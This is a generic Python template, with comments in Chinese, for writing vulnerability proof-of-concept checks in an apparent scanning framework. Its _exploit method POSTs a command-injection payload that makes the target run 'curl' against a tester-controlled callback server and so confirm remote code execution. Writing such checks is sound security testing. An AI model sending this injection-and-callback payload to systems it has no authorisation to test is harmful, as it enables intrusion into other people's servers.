#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random
import string
from collections import OrderedDict

# 自动安装库的功能所需要的库
import subprocess
import sys
import importlib

class DemoPOC:
    appName = ''              # 漏洞影响的应用或组件名称
    appVersion = ''           # 漏洞影响版本
    install_requires = []     # 你可以在这里添加其他需要的库
    CVE_ID = ""               #CVE编号
    Vul_name = ""             #漏洞名称
    Type = ""                 #漏洞类型
    Description = ""          #漏洞描述
    Script_type = "python"    #POC类型（暂时只支持python）
    Script = "xxx.py"         #POC文件名（包含后缀）
    Vul_Date = ""             # 漏洞公开日期

    def __init__(self, url, ip, port,server_ip,server_port):
        self.url = url
        self.ip = ip
        self.port = port
        self.server_ip = server_ip
        self.server_port = server_port
        self.options = self._options()  # 初始化 options

    def check_and_install_dependencies(self):
        """检查并安装所需的库"""
        missing_packages = []
        for package in self.install_requires:
            try:
                importlib.import_module(package)
            except ImportError:
                missing_packages.append(package)

        if missing_packages:
            print(f"Missing packages: {missing_packages}. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", *missing_packages])
                print(f"Successfully installed: {missing_packages}")
            except subprocess.CalledProcessError as e:
                print(f"[ERROR] Failed to install required packages: {e}")
                return False
        return True

    def random_str(self, length):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    #所需用到的配置信息
    def _options(self):
        """定义POC运行时所需的选项"""
        o = OrderedDict()
        o['user'] = ''  #支持认证的账号
        o['pwd'] = ''   #支持认证的密码
        return o

    def get_option(self, key):
        """从options中获取选项值"""
        if key in self.options:
            return self.options[key]  # 返回选项的值
        else:
            raise KeyError(f"Option '{key}' not found in available options.")

    def _exploit(self):
        """漏洞利用阶段，向目标发送请求并触发远程代码执行"""
        user = self.get_option('user')
        pwd = self.get_option('pwd')
        # 构建 payload，模拟漏洞利用，向目标系统（已经构建好的服务器）发送 curl 请求
        callback_url = f"http://{self.server_ip}:{self.server_port}/poc_callback"
        exploit_payload = f'curl {callback_url}'  # 注入 curl 命令，让目标系统访问 callback_url

        # 实际漏洞利用细节，这里你可以根据具体漏洞构造适合的 payload
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = f'a={exploit_payload}'  # 根据实际漏洞情况构建
        result = {}

        try:
            print(f"Attempting to exploit {self.url} with payload: {exploit_payload}")
            res = requests.post(self.url, headers=headers, data=payload)
            result['ExploitResponse'] = res.text
            print(f"Exploit response: {res.text}")

            # 检查服务器响应内容，确认漏洞利用成功
            if "POC callback received and logged" in res.text:
                result['VerifyInfo'] = f"[!] Vulnerability confirmed at {self.url}"
            else:
                result['Error'] = "[SAFE] Server did not return expected callback response."
        except requests.RequestException as e:
            result['Error'] = f"[ERROR] Exploit request failed: {e}"

        return result

    def _verify(self):
        """执行漏洞验证"""
        self.check_and_install_dependencies()    #在提示无对应库时，单独运行此行代码。
        result = {}
        try:
            # 调用 _exploit 方法来执行漏洞利用
            exploit_result = self._exploit()
            result.update(exploit_result)
        except Exception as e:
            result['Error'] = f"[ERROR] Error during POC execution: {str(e)}"
        return result
